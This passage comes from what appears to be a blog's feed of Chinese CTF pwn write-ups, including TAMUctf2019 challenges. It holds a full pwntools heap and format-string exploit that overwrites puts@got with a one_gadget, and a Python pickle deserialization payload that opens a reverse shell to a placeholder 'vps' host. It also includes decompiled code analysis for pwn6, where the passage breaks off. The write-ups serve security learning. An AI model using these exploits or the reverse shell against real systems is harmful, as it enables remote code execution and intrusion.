&amp;s);</span><br><span class="line">  &#125;</span><br><span class="line">  format = (<span class="keyword">char</span> *)a1-&gt;head;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; SLODWORD(a1-&gt;count) &gt; (<span class="keyword">signed</span> <span class="keyword">int</span>)i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Item #%d: "</span>, i);</span><br><span class="line">    <span class="built_in">printf</span>(format);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    format = (<span class="keyword">char</span> *)*((_QWORD *)format + <span class="number">3</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里存在一个很明显的格式化字符串漏洞，但是参数并不存在栈中，利用起来会有不少麻烦。<code>item</code>名字的打印次数跟<code>count</code>有关，如果通过UAF泄露信息，必须要注意<code>count</code>的大小。</p><p>关于heap地址泄露，是在调试过程无意发现的，某次的调试过程发现出现不可见字符。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190313083921-7119e046-4528-1.png" alt=""></p><p>gdb调试看一下内存到底是什么情况，竟然发现当<code>item</code>名字用<code>Peppercorn Mushroom Melt</code>时，由于这个名字长度为24，把后面的<code>*next_item</code>拼接上了，把堆地址泄露出来，这个不知道是不是出题人故意留的漏洞，太隐蔽了！</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190313083938-7b3bc4f4-4528-1.png" alt=""></p><p>由于思考过程过于曲折，我直接给出最终的思路，配合EXP食用：</p><ol><li>首先创建名字为<code>Peppercorn Mushroom Melt</code>的<code>item</code>泄露heap地址；</li><li>删除最后一个<code>item</code>，用<code>add_name</code>把释放的内存复写，<code>*next_item</code>写上order的结构体地址；</li><li>用<code>add_name</code>准备两个格式化字符串payload，注意<code>*next_item</code>要连接好，用于将<code>puts@got.plt</code>的地址写入栈中，为之后改<code>puts@got.plt</code>做准备；</li><li>使用<code>remove_item</code>第4个迷之操作，删除第4个<code>item</code>，此时实际只有2个<code>item</code>，函数一路查找到order的结构体，然后删掉；</li><li>用<code>add_name</code>把释放的内存复写，伪造一个order的结构体，其中<code>*name</code>改成got表地址，泄露libc地址；<code>head</code>、<code>tail</code>和<code>count</code>也需要精心构造。</li><li>使用<code>view_order</code>泄露libc地址，并且通过精心构造的<code>item</code>链触发格式化字符串；</li><li>删掉第一个格式化字符串payload，写入一个新的格式化字符串payload，利用<code>remove_item</code>第二个迷之操作删掉第二个格式化字符串payload，写入一个新的格式化字符串payload。</li><li>使用<code>view_order</code>触发格式化字符串，将<code>puts@got.plt</code>改为<code>one_gadget</code></li></ol><p>EXP:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_name</span><span class="params">(name)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt;'</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'name?\n'</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_item</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt;'</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'4. Dave\'s Single\n'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_item</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt;'</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'remove\n'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_order</span><span class="params">()</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt;'</span>,<span class="string">'4'</span>)</span><br><span class="line"><span class="comment">#leak heap addr</span></span><br><span class="line">add_item(<span class="number">3</span>)</span><br><span class="line">add_item(<span class="number">3</span>)</span><br><span class="line">view_order()</span><br><span class="line">p.recvuntil(<span class="string">'Melt'</span>)</span><br><span class="line">heap_addr = u64(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x70</span></span><br><span class="line"><span class="comment">#leak libc addr &amp; write puts@got.plt to stack</span></span><br><span class="line">add_item(<span class="number">3</span>) </span><br><span class="line">remove_item(<span class="number">2</span>)</span><br><span class="line">add_name(<span class="string">'a'</span>*<span class="number">24</span>+p64(heap_addr + <span class="number">0x10</span>)[:<span class="number">-1</span>]) </span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$n'</span>.format(elf.got[<span class="string">'puts'</span>],<span class="number">16</span>)</span><br><span class="line">add_name(payload.ljust(<span class="number">24</span>,<span class="string">'a'</span>)+p64(heap_addr+<span class="number">0x100</span>)[:<span class="number">-1</span>]) </span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$n'</span>.format(elf.got[<span class="string">'puts'</span>]+<span class="number">1</span>,<span class="number">47</span>)</span><br><span class="line">add_name(payload.ljust(<span class="number">24</span>,<span class="string">'b'</span>)+p64(heap_addr+<span class="number">0x40</span>)[:<span class="number">-1</span>]) </span><br><span class="line">add_name(<span class="string">'c'</span>*<span class="number">24</span>+p64(heap_addr+<span class="number">0xd0</span>)[:<span class="number">-1</span>]) </span><br><span class="line"></span><br><span class="line">remove_item(<span class="number">3</span>)</span><br><span class="line">add_name(p64(heap_addr+<span class="number">0x130</span>)+p64(heap_addr+<span class="number">0x100</span>)+p64(elf.got[<span class="string">'free'</span>])+p64(<span class="number">5</span>)[:<span class="number">-1</span>])</span><br><span class="line">view_order()</span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - libc.sym[<span class="string">'free'</span>]</span><br><span class="line">one_gadget = libc.address + <span class="number">0x45216</span></span><br><span class="line"></span><br><span class="line">byte1 = one_gadget &amp; <span class="number">0xff</span></span><br><span class="line">byte2 = (one_gadget &amp; <span class="number">0xffff00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line">remove_item(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$hhn'</span>.format(byte1,<span class="number">24</span>)</span><br><span class="line">add_name(payload.ljust(<span class="number">24</span>,<span class="string">'d'</span>))</span><br><span class="line">remove_item(<span class="number">3</span>)</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(byte2,<span class="number">52</span>) </span><br><span class="line">add_name(payload.ljust(<span class="number">24</span>,<span class="string">'e'</span>)+p64(heap_addr+<span class="number">0xd0</span>)[:<span class="number">-1</span>])</span><br><span class="line">view_order()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>前面3题的难度总体来说不高，不过最后一题的漏洞利用花了好长时间进行调试和修正，这题的单链处理有各种漏洞，做题过程中也发现可以<code>fastbin dup</code>，不过最终效果并不太好，多次调整策略后最终放弃了，如果各位大佬有其他解法，欢迎一起讨论。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本文首发于先知论坛 &lt;a href=&quot;https://xz.aliyun.com/t/4423&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://xz.aliyun.com/t/4423&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;Baby-Pwn&quot;&gt;&lt;a
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://4f-kira.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>TAMUctf2019-pwn-writeup</title>
    <link href="https://4f-kira.github.io/2019/05/31/TAMUctf2019-pwn-writeup/"/>
    <id>https://4f-kira.github.io/2019/05/31/TAMUctf2019-pwn-writeup/</id>
    <published>2019-05-31T02:24:27.000Z</published>
    <updated>2019-05-31T02:26:08.881Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于先知论坛 <a href="https://xz.aliyun.com/t/4327" target="_blank" rel="noopener">https://xz.aliyun.com/t/4327</a></p><p>pwn1-5的题目不难，之前已经有师傅发过writeup了，现在我把剩余两题pwn的writeup补充一下。</p><h2 id="VeggieTales"><a href="#VeggieTales" class="headerlink" title="VeggieTales"></a>VeggieTales</h2><p>题目描述：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">It&apos;s my favorite show to watch while practicing my python skills! I&apos;ve seen episode 5 at least 13 times.</span><br><span class="line"></span><br><span class="line">nc pwn.tamuctf.com 8448</span><br><span class="line"></span><br><span class="line">Difficulty: easy-medium</span><br><span class="line"></span><br><span class="line">2.23 1:58 pm CST: Added hint to description</span><br></pre></td></tr></table></figure><p>题目没有给elf，根据题目描述，应该是一个python写的应用，nc过去看一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Do you like VeggieTales??</span><br><span class="line">1. Add an episode to your watched list</span><br><span class="line">2. Print your watch list</span><br><span class="line">3. Backup your watch list</span><br><span class="line">4. Load your watch list</span><br></pre></td></tr></table></figure><p>菜单功能：</p><ol><li>添加看过的剧集，只能输入1-47</li><li>打印已看过的剧集</li><li>备份当前清单，会返回一串base64</li><li>输入备份得到的那串base64，可恢复已看剧集清单</li></ol><p>简单fuzz了一下，没发现什么漏洞，后来题目给出了提示<code>I&#39;ve seen episode 5 at least 13 times.</code>，看一下第5部ep是<code>5.  Dave and the Giant Pickle</code>，马上联想到是python pickle反序列化！</p><p>首先添加一部剧集，拿到一串base64进行分析，尝试直接使用pickle反序列化出现报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;X:\tmp\pwn7.py&quot;, line 69, in &lt;module&gt;</span><br><span class="line">    print(pickle.loads(base64.b64decode(s)))</span><br><span class="line">_pickle.UnpicklingError: invalid load key, &apos;\xb4&apos;.</span><br></pre></td></tr></table></figure><p>对比了一下正常的序列化字符串，发现要先经过ROT13后再base64decode，修改一下代码再次测试。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64, string, pickle, codecs</span><br><span class="line">s = <span class="string">"tNAqpDOLUDNNNQHhVPORLKMyVTShMPO0nTHtE2yuoaDtHTywn2kypDSuYt=="</span></span><br><span class="line">print(pickle.loads(base64.b64decode(codecs.encode(s,<span class="string">"rot-13"</span>))))</span><br><span class="line"><span class="comment"># ['5.  Dave and the Giant Pickle']</span></span><br></pre></td></tr></table></figure><p>根据以上分析，我们直接写一个反弹shell的payload，然后在<code>Load your watch list</code>那里进行反序列化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64, string, pickle, codecs, platform</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Exploit</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (platform.popen,(<span class="string">"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"vps\",20004));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"</span>,))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">serialize_exploit</span><span class="params">()</span>:</span></span><br><span class="line">    shellcode = pickle.dumps(Exploit())</span><br><span class="line">    <span class="keyword">return</span> shellcode</span><br><span class="line"></span><br><span class="line">exp = codecs.encode(str(base64.b64encode(serialize_exploit())),<span class="string">"rot-13"</span>)</span><br><span class="line">print(exp)</span><br></pre></td></tr></table></figure><p>本地监听端口，另一边输入生成的exp，成功反弹回来（你需要一个有公网ip的vps）</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190305192954-ffbfbec8-3f39-1.png" alt=""></p><h2 id="pwn6"><a href="#pwn6" class="headerlink" title="pwn6"></a>pwn6</h2><p>题目描述：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Setup the VPN and use the client to connect to the server.</span><br><span class="line"></span><br><span class="line">The servers ip address on the vpn is 172.30.0.2</span><br><span class="line"></span><br><span class="line">Difficulty: hard</span><br><span class="line"></span><br><span class="line">2/23 10:06 am: Added server ip</span><br></pre></td></tr></table></figure><p>题目给了一个openvpn的配置文件，以及client和server的二进制文件。</p><p>程序保护情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/tmp/client&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line"></span><br><span class="line">[*] &apos;/tmp/server&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>openvpn安装使用方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y openvpn</span><br><span class="line">cp pwn6.ovpn /etc/openvpn/</span><br><span class="line">sudo openvpn pwn6.ovpn</span><br></pre></td></tr></table></figure><p>尝试运行一下client，程序提供两个选项，选项0没什么用，选项1进行登陆，由于没账号密码，输入后提示账号无效，还是直接看二进制文件分析吧。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> 0. View Recent Login&apos;s With client</span><br><span class="line"> 1. Login</span><br><span class="line">Enter command to send to server...</span><br></pre></td></tr></table></figure><p>由于flag存在server端，我们最终的目标还是要pwn掉server，因此先对server进行分析。server程序功能非常多，里面有不少sql操作，一度往数据库注入方向想，后来一想这是pwn题，不要走歪了。之后在server中发现一个叫<code>process_message</code>函数，看程序逻辑，应该就是处理client发送信息的函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">process_message</span><span class="params">(struct server *a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// ST14_4</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// ST00_8</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = *((_QWORD *)a2 + <span class="number">1</span>);                     <span class="comment">// send_data</span></span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)&amp;a2[<span class="number">2</span> * (*(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(v5 + <span class="number">4</span>) + <span class="number">4L</span>L) + <span class="number">2</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = (*(__int64 (__fastcall **)(struct server *, <span class="keyword">unsigned</span> <span class="keyword">int</span> *))&amp;a2[<span class="number">2</span> * (*(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(v5 + <span class="number">4</span>) + <span class="number">4L</span>L) + <span class="number">2</span>])(</span><br><span class="line">           a1,</span><br><span class="line">           a2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Result of action was %i\n"</span>, v2, a2);</span><br><span class="line">    result = v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Unauthorized Command for Client %i\n"</span>, *a2, a2);</span><br><span class="line">    <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)(*(_QWORD *)(v4 + <span class="number">8</span>) + <span class="number">8L</span>L));  <span class="comment">// fmt</span></span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure><p>这里有一个很明显的格式化字符串漏洞，不过要运行到漏洞分支，需要绕过<code>if</code>的判断，目前还不清楚client发包的结构，因此转到分析client的程序，从client入手分析发包过程。定位到client登陆操作用到的函数中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">send_login</span><span class="params">(<span class="keyword">int</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int8 user_len; <span class="comment">// ST1F_1</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 pwd_len; <span class="comment">// ST1E_1</span></span><br><span class="line">  <span class="keyword">char</span> passwd[<span class="number">256</span>]; <span class="comment">// [rsp+20h] [rbp-310h]</span></span><br><span class="line">  <span class="keyword">char</span> user[<span class="number">520</span>]; <span class="comment">// [rsp+120h] [rbp-210h]</span></span><br><span class="line">  _BYTE *send_data; <span class="comment">// [rsp+328h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input Username for login:"</span>);</span><br><span class="line">  prompt_string(user, <span class="number">256</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input Password for login:"</span>);</span><br><span class="line">  prompt_string(passwd, <span class="number">256</span>);</span><br><span class="line">  send_data = <span class="built_in">malloc</span>(<span class="number">0x202</span>uLL);</span><br><span class="line">  user_len = <span class="built_in">strlen</span>(user) - <span class="number">1</span>;</span><br><span class="line">  pwd_len = <span class="built_in">strlen</span>(passwd) - <span class="number">1</span>;</span><br><span class="line">  user[user_len] = <span class="number">0</span>;</span><br><span class="line">  passwd[pwd_len] = <span class="number">0</span>;</span><br><span class="line">  *send_data = user_len;</span><br><span class="line">  send_data[<span class="number">1</span>] = pwd_len;</span><br><span class="line">  <span class="built_in">memcpy</span>(send_data + <span class="number">2</span>, user, user_len);</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;send_data[user_len + <span class="number">2</span>], passwd, pwd_len);</span><br><span class="line">  send_msg(a1, <span class="number">0</span>, send_data, user_len + pwd_len + <span class="number">2</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Message sent to server."</span>);</span><br><span class="line">  read(*a1, a1 + <span class="number">2</span>, <span class="number">4u</span>LL);</span><br><span class="line">  sleep(<span class="number">2u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1[<span class="number">2</span>] &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFE</span>LL;</span><br><span class="line">  a1[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">send_msg</span><span class="params">(<span class="keyword">int</span> *a1, <span class="keyword">int</span> a2, <span class="keyword">void</span> *a3, <span class="keyword">unsigned</span> <span class="keyword">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">void</span> *src; <span class="comment">// ST08_8</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> n; <span class="comment">// ST10_4</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+2Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">void</span> *ptr; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  _DWORD *buf; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v9; <span class="comment">// [rsp+4Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  src = a3;</span><br><span class="line">  n = a4;</span><br><span class="line">  v9 = a4 + <span class="number">8</span>;</span><br><span class="line">  buf = <span class="built_in">malloc</span>(a4 + <span class="number">8L</span>L);</span><br><span class="line">  ptr = buf;</span><br><span class="line">  *buf = n;</span><br><span class="line">  buf[<span class="number">1</span>] = a2;</span><br><span class="line">  <span class="built_in">memcpy</span>(buf + <span class="number">2</span>, src, n);</span><br><span class="line">  <span class="keyword">while</span> ( v9 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = write(*a1, buf, v9);</span><br><span class="line">    <span class="keyword">if</span> ( v6 &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">"Send"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    buf = (_DWORD *)((<span class="keyword">char</span> *)buf + v6);</span><br><span class="line">    v9 -= v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序读取用户名和密码后，计算用户名和密码的长度，然后申请了一块内存储存用户名和密码，以及对应的长度，再通过<code>send_msg</code>进行发送到server。写个简单的代码，在<code>send_msg</code>处下个断点，动态调试一下，可以看到client发送的数据包结构：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process([<span class="string">'./client'</span>, <span class="string">'127.0.0.1'</span>])</span><br><span class="line">p.sendlineafter(<span class="string">'server...\n'</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'login:\n'</span>,<span class="string">'1111'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'login:\n'</span>,<span class="string">'2222'</span>)</span><br></pre></td></tr></table></figure><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190305193038-1996e128-3f3a-1.png" alt=""></p><p>根据gdb调试的结果，可以推断出client的数据包结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">login_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">int</span> user_len;</span><br><span class="line">  <span class="keyword">int</span> pwd_len;</span><br><span class="line">  <span class="keyword">char</span> user;</span><br><span class="line">  <span class="keyword">char</span> passwd;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">send_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   int32 data_len;</span><br><span class="line">   int32 action;</span><br><span class="line">   <span class="keyword">char</span> login_data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>client发包后，同理在server端<code>process_message</code>处下个断点，看看server端是如何处理数据包的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> ► 0x4052b9 &lt;handle_connections+1392&gt;    call   process_message &lt;0x404c99&gt;</span><br><span class="line">        rdi: 0x7fffffffe040 ◂— 0x4</span><br><span class="line">        rsi: 0x6d8590 ◂— 0x7</span><br><span class="line">        </span><br><span class="line">pwndbg&gt; x/4gx 0x6d8590</span><br><span class="line">0x6d8590:       0x0000000000000007      0x00000000006d6480</span><br><span class="line">0x6d85a0:       0x0000000000000000      0x0000001200000000   </span><br><span class="line">pwndbg&gt; x/4gx 0x00000000006d6480</span><br><span class="line">0x6d6480:       0x000000000000000a      0x3232313131310404</span><br><span class="line">0x6d6490:       0x0000000000003232      0x0000000000000031</span><br></pre></td></tr></table></figure><p>可见<code>process_message</code>的<code>v5 = *((_QWORD *)a2 + 1)</code>就是client发的数据包。现在需要分析一下<code>if ( *(_QWORD *)&amp;a2[2 * (*(unsigned int *)(v5 + 4) + 4LL) + 2] )</code>是干什么的？直接看一下汇编，不难发现<code>rdx</code>的值为<code>send_data-&gt;action</code>的值，也就是<code>send_msg</code>的第二个参数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td 